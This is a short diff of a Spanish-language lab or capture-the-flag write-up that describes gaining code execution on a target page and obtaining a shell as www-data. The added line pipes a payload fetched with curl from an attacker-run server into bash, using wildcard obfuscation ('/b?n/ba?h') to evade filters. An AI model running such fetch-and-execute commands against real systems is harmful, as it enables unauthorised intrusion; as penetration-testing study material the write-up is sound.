@@ -52,5 +52,6 @@ tenemos una pagina que al parecer nos permite ejecutar codigo
 ![[Pasted image 20231118212931.png]]
 ### hemos creado un archivo shell.php con una reverse shell y hemos creado un servidor en python para poder conpartirnos el archivo y paralelamente nos hemos puesto a la escucha para poder obtener la shel
 ```python
-	curl 10.8.203.
+	curl 10.8.203.6:8000/shellencod.php | /b?n/ba?h
 ```
+### somos el usuario www-data
